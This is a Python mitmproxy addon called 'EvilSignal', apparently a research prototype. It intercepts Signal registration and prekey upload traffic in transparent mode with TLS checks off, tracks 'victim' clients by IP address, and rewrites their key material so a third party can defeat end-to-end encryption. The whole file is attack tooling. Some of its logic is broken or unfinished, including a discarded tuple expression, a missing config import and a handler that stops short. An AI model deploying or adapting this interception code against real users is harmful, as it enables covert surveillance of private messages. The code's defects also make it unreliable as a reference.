import base64
from copy import deepcopy

import mitmproxy.websocket
from mitmproxy import ctx
from mitmproxy.addonmanager import Loader
from mitmproxy.http import HTTPFlow, Request, Response, Headers
from mitmproxy.net.http.status_codes import RESPONSES
from dataclasses import dataclass
from typing import Optional, Union
import logging

# FORMAT = "[%(filename)s:%(lineno)s-%(funcName)20s()] %(message)s"
# logging.basicConfig(format=FORMAT)
# logging.getLogger('mitmproxy').
import time

from src.orchestrator import MitmUserOrchestrator

# import config

from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
import json
from signal_protocol import state, helpers
from signal_protocol.address import ProtocolAddress, DeviceId
from signal_protocol.identity_key import IdentityKeyPair, IdentityKey
from signal_protocol.curve import PublicKey, PrivateKey
from signal_protocol.sealed_sender import sealed_sender_decrypt
from signal_protocol import kem
from base64 import b64decode, b64encode

import src.utils as utils
from src.mitm_interface import MitmUser, MitmVisitenKarte, VisitenKarteType
from src.constants import TRUST_ROOT_STAGING_PK
from db.database import User, Device, LegitKeyRecord, StoreKeyRecord, VisitenKarte, ConversationSession
from db.session import DatabaseSessionManager
from enum import Enum
import parse

from protos.gen.SignalService_pb2 import Content, Envelope, DataMessage
from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
from signal_protocol.protocol import CiphertextMessage
from signal_protocol.state import PreKeyBundle

from src.server_proto import addons, HOST_HTTPBIN
from src.mitm_interface import MitmUser
from collections import defaultdict


# logging.getLogger().addHandler(utils.ColorHandler())
# todo -- fix logging precedence -- https://stackoverflow.com/a/20280587
# logging.getLogger('passlib').setLevel(logging.ERROR)  # suppressing an issue coming from xepor -> passlib
# logging.getLogger('parse').setLevel(logging.ERROR)  # don't care
# logging.getLogger('peewee').setLevel(logging.WARN)  # peewee emits full SQL queries otherwise which is not great
# logging.getLogger('xepor.xepor').setLevel(logging.INFO)
# logging.getLogger('mitmproxy.proxy.server').setLevel(logging.WARN)  # too noisy


def dataMessageFlags(flags_value: int):
    from protos.gen.SignalService_pb2 import DataMessage

    # Check which flags are set in the flags_value
    flags_set = {
        "END_SESSION": bool(flags_value & DataMessage.END_SESSION),
        "EXPIRATION_TIMER_UPDATE": bool(flags_value & DataMessage.EXPIRATION_TIMER_UPDATE),
        "PROFILE_KEY_UPDATE": bool(flags_value & DataMessage.PROFILE_KEY_UPDATE),
    }
    return flags_set


class CiphertextMessageType(Enum):
    WHISPER = 2
    PRE_KEY_BUNDLE = 3
    SENDER_KEY_DISTRIBUTION = 7
    PLAINTEXT = 8


class ContentHint(Enum):
    DEFAULT = 0  # This message has content, but you shouldn't expect it to be re-sent to you
    RESENDABLE = 1  # You should expect to be able to have this content be re-sent to you
    IMPLICIT = 2  # This message has no real content and likely cannot be re-sent to you


class EnvelopeType(Enum):
    # https://github.com/signalapp/Signal-Android/blob/main/libsignal-service/src/main/protowire/SignalService.proto#L14-L23
    UNKNOWN = 0
    CIPHERTEXT = 1
    KEY_EXCHANGE = 2
    PRE_KEY_BUNDLE = 3
    RECEIPT = 5
    UNIDENTIFIED_SENDER = 6
    reserved_SENDERKEY_MESSAGE = 7
    PLAINTEXT_CONTENT = 8


@dataclass
class PendingWebSocket:
    request: WebSocketRequestMessage = None
    response: WebSocketResponseMessage = None


websocket_open_state = defaultdict(PendingWebSocket)


@dataclass
class KeyData:
    IdenKey: Optional[str] = None
    SignedPreKey: Optional[dict] = None
    pq_lastResortKey: Optional[dict] = None
    PreKeys: Optional[list[dict]] = None
    pq_PreKeys: Optional[list[dict]] = None

    # fake_IdenKey: Optional[str] = None
    # fake_signed_pre_key: Optional[dict] = None
    # fake_signed_pre_key_secret: Optional[str] = None

    # fake_PreKeys: Optional[list[dict]] = None
    # fake_secret_PreKeys: Optional[dict] = None

    # fake_pq_PreKeys: Optional[list[dict]] = None
    # fake_secret_pq_PreKeys: Optional[dict] = None

    # fake_last_resort_key: Optional[dict] = None
    # fake_secret_last_resort_key: Optional[str] = None


@dataclass
class RegistrationInfo:
    aci: Optional[str] = None
    pni: Optional[str] = None
    unidentifiedAccessKey: Optional[str] = None
    registrationId: Optional[int] = None
    pniRegistrationId: Optional[int] = None

    aciData: KeyData = None
    pniData: KeyData = None

    victim: MitmUser = None

    #serialized_registration_req: Optional[dict] = None


@dataclass
class BobIdenKey:
    uuid: str
    identityKey: Optional[IdentityKeyPair] = None
    fake_identityKey: Optional[IdentityKeyPair] = None


registration_info: dict[str, RegistrationInfo] = None
conversation_session: dict[str, (MitmUser, MitmUser)] = dict()
bobs_bundle = dict()
REGISTRATION_INFO_PATH = "registration_info.json"

api = addons[0]


class EvilSignal(InterceptedAPI):
    wrapped_api = None

    local_registrations = dict()

    def __init__(self, wrapped_api: InterceptedAPI):
        self.wrapped_api = wrapped_api
        logging.info(f"++++++++++++++++++++++++\nSTARTING mitm against: \n{HOST_HTTPBIN}\n++++++++++++++++++++++++")
        super().__init__(
            default_host=wrapped_api.default_host,
            host_mapping=wrapped_api.host_mapping,
            blacklist_domain=wrapped_api.blacklist_domain,
            request_passthrough=wrapped_api.request_passthrough,
            response_passthrough=wrapped_api.response_passthrough,
            respect_proxy_headers=wrapped_api.respect_proxy_headers,
        )
        if self.wrapped_api is not None:
            for route in self.wrapped_api.request_routes.routes:
                host, path, method, handler, allowed_statuses = route
                self.request_routes.add_route(host, path, method, handler, allowed_statuses)
            for route in self.wrapped_api.response_routes.routes:
                host, path, method, handler, allowed_statuses = route
                self.response_routes.add_route(host, path, method, handler, allowed_statuses)
            for route in self.wrapped_api.ws_request_routes.routes:
                host, path, mtype, handler = route
                self.ws_request_routes.add_route(host, path, mtype, handler)
            for route in self.wrapped_api.ws_response_routes.routes:
                host, path, mtype, handler = route
                self.ws_response_routes.add_route(host, path, mtype, handler)

    def load(self, loader: Loader):
        loader.add_option(
            name="registration_info",
            typespec=dict,
            default={},
            help="Registration data of the ",
        )

        super().load(loader)  # pass remaining to


api = EvilSignal(api)


def json_to_registrations(json_registrations: str) -> dict[str, RegistrationInfo]:
    loaded_dict = json.loads(json_registrations)
    return {key: utils.json_to_dataclass(RegistrationInfo, value) for key, value in loaded_dict.items()}


@api.route("/v1/registration", rtype=RouteType.REQUEST)
def _v1_registration(flow: HTTPFlow):
    req = json.loads(flow.request.content)
    ip_address = flow.client_conn.peername[0]

    reg_info = api.local_registrations

    try:
        user_registration_info = reg_info[ip_address]
    except KeyError:
        user_registration_info = RegistrationInfo()

    req, user_registration_info = MitmUserOrchestrator.registration_req(req, user_registration_info)

    reg_info[ip_address] = user_registration_info
    api.local_registrations = reg_info
    
    
    flow.request.content = json.dumps(req).encode()


@api.route("/v1/registration", rtype=RouteType.RESPONSE)
def _v1_registration(flow: HTTPFlow):
    # todo - move to discrete route once xepor matching bug is fixed
    status = flow.response.status_code
    seconds_left = flow.response.headers.get("Retry-After", -1)
    fail_cases = {
        403: "Verification failed for the provided Registration Recovery Password",
        409: "The caller has not explicitly elected to skip transferring data from another device, but a device transfer is technically possible",
        422: "The request did not pass validation: `isEverySignedKeyValid` (https://github.com/signalapp/Signal-Server/blob/9249cf240e7894b54638784340231a081a2e4eda/service/src/main/java/org/whispersystems/textsecuregcm/entities/RegistrationRequest.java#L100-L106) failed",
        423: "Registration Lock failure.",
        429: f"Too many attempts, try after {utils.human_time_duration(seconds_left)} ({seconds_left} seconds)",
    }
    if status in fail_cases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(
            f"Registration failed with error code {status} {resp_name} -- {fail_cases[status]}\n{flow.response.content}"
        )
        return

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.peername[0]

    registration_info: RegistrationInfo = api.local_registrations[ip_address]

    resp, registration_info = MitmUserOrchestrator.registration_resp(resp, registration_info)

    api.local_registrations[ip_address] = registration_info

    logging.info(f"Registration successful {api.local_registrations[ip_address]}")


@api.route("/v2/keys", rtype=RouteType.REQUEST, method=HTTPVerb.PUT)
def _v2_keys(flow: HTTPFlow):
    identity = flow.request.query["identity"]
    identity_type = VisitenKarteType.ACI if identity == "aci" else VisitenKarteType.PNI
    req = json.loads(flow.request.content)
    address = flow.client_conn.peername[0]

    logging.info(req["preKeys"][0])

    registration_info = api.local_registrations

    req, registration_info, MitmUserOrchestrator.keys_upload_req(req, identity, registration_info)

    # ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
    # if not registration_info.get(address):
    #     logging.error(
    #         f"Address {address} not found in registration_info. {registration_info}"
    #     ) 
    #     return

    # user_registration_info: RegistrationInfo = registration_info.get(address)

    # key_data = user_registration_info.aciData if identity == "aci" else user_registration_info.pniData

    # key_data.PreKeys = req["preKeys"]
    # key_data.pq_PreKeys = req["pqPreKeys"]

    # alice = user_registration_info.victim

    # alice.get_visitenkarte(identity_type).update_kyber_pre_keys(key_data.pq_PreKeys[0]["keyId"])
    # alice.get_visitenkarte(identity_type).update_pre_keys(key_data.PreKeys[0]["keyId"])

    # req["preKeys"] = alice.get_visitenkarte(identity_type).serialize_pre_keys()
    # req["pqPreKeys"] = alice.get_visitenkarte(identity_type).serialize_kyber_pre_keys()

    flow.request.content = json.dumps(req).encode()


@api.route("/v2/keys", rtype=RouteType.RESPONSE)
def v2_keys_errors(flow: HTTPFlow):
    status = flow.response.status_code
    address = flow.client_conn.peername[0]
    identity = flow.request.query["identity"] == "aci"
    resp = json.loads(flow.response.content) if flow.response.content else {}
    identity_type = VisitenKarteType.ACI if identity == "aci" else VisitenKarteType.PNI
    other_identity_type = VisitenKarteType.PNI if identity_type == VisitenKarteType.ACI else VisitenKarteType.ACI
    failcases = {
        401: "Account authentication check failed.",
        403: "Attempt to change identity key from a non-primary device.",
        422: "Invalid request format (Invalid si gnatures -- not all sigs [pqPreKeys,pqLastResortPreKey,signedPreKey] are valid).",
    }
    if status in failcases:
        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
        logging.warning(
            f"Registration failed with error code {status} {resp_name} -- {failcases[status]}\n{flow.request.content}"
        )

    #### check registration info if the it is the last response of v2/keys

    user_info: RegistrationInfo = api.local_registrations[address]

    MitmUserOrchestrator.keys_upload_resp(resp, identity, user_info)
    


@api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str):

    address = flow.client_conn.peername[0]
    resp = json.loads(flow.response.content)
    user_info: RegistrationInfo = api.local_registrations[address]
    
    ## check if the keybundle is from already registered (legit or victim) user in the database
    bob_key_bundle = PreKeyBundle(
        registration_id= resp["devices"][0]["registrationId"],
        device_id= resp["devices"][0]["deviceId"],
        pre_key_public= (resp["devices"][0]["preKey"]["keyId"], resp["devices"][0]["preKey"]["publicKey"]),
        signed_pre_key_id= resp["devices"][0]["signedPreKey"]["keyId"],
        signed_pre_key_public= resp["devices"][0]["signedPreKey"]["publicKey"],
        signed_pre_key_signature= resp["devices"][0]["signedPreKey"]["signature"],
        identity_key= IdentityKey.from_base64(resp["identityKey"])
     )



#     api.local_registrations[address] = user_info

addons = [api]

from mitmproxy.tools.main import mitmdump

if __name__ == "__main__":

    flow_name = f"debug_{int(time.time())}.flow"
    f = open(REGISTRATION_INFO_PATH, "wb")
    f.write(b"{}")
    f.close()

    params = [
        # "-q",   # quiet flag, only script's output
        "--mode",
        "transparent",
        "--showhost",
        "--ssl-insecure",
        "--ignore-hosts",
        config.IGNORE_HOSTS,
        "-s",  # script flag
        __file__,  # use the same file as the hook
        # "-r",
        # "mitmproxy_flows/PQ_registration"
        "-w",
        flow_name,
    ]
    mitmdump(params)
